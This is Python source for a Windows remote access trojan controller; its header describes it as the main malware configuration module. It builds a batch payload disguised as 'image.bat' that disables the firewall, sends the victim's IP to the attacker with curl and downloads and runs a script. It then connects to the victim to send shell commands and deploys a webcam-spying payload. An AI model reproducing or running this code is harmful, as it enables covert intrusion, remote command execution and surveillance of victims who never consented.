"""
Author: Martin Calamel
Created: 2025-02-26
Description: module principal pour le configurer le malware
TODO: réorganiser le code
      mettre en place les bonnes pratiques
"""


# importation des modules
import socket, sys,time,os,threading,csv
import payload.cam_pirate as cam
from colorama import Fore,deinit,init
from modules.fonctions import get_ip, generation_vecteur, menu

def generation(HOST):
    os.system("del payload/image.bat")
    fich=open('payload/image.bat','w')
    msg="NetSh Advfirewall set allprofiles state off\n(for /F \"tokens=16\" %%i in (\'\"ipconfig | findstr IPv4\"\') do (curl -d %%i http://"
    msg+=HOST+":8888/))\ncurl http://"
    msg+=HOST+":8000/payload/jeu.pyw -o jeu.py\npython jeu.py"
    fich.write(msg)
    fich.close()

def ip():
    donnees=[]
    while donnees==[]:
        fich=open('message.txt','r')
        c=csv.reader(fich,delimiter=';')
        donnees=[]
        for ligne in c:
            donnees.append(ligne)
        fich.close
    return(donnees[0][0])

init()
menu()


HOST = get_ip()

fich=open('selfIp.txt','w')
fich.write(HOST)
fich.close()
print("Nouvelle cible    [1]")
print("Ancienne cible    [2]")
a=input(">>> ")
if a=="1":
    f=open("message.txt","w")
    f.write("")
    f.close()
    try:
        os.system("start /Min servers/server.py")
        os.system("start /Min node servers/server.js")
        print("server ok")
    except:
        print("error server")
        sys.exit()
    print("generation du payload...")
    generation_vecteur(HOST)
    print("payload enregistré sous le nom image.bat")



print("démarage de l'ecoute")
mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# mySocket.settimeout(5)
PORT = 55027
print("Resverse lisening on ",ip(),"port ",PORT)
while True:
    try:
        mySocket.connect((ip(), PORT))
        break
    except:
        continue
print(Fore.GREEN,"Connection OK",Fore.WHITE)
time.sleep(1)
while True:
    msg=input("C> ")
    if msg=="cam":
        msg="pip install opencv-python"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print("importation des modules ok")
        msg="curl http://"+HOST+":8000/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print("telechargement du payload ok")
        msg="start C:\\Users\\Public\\Documents\\cam.pyw"
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print("lancement du payload ok")
        cam.webcam()
    elif msg=="exit":
        break
    else:
        mySocket.send(msg.encode("Utf8"))
        msgServeur = mySocket.recv(1024).decode("Utf8")
        while msgServeur!='ex':
            msgServeur=mySocket.recv(1024).decode("Utf8")
            print(msgServeur)


print("Connexion interrompue.")
mySocket.close()
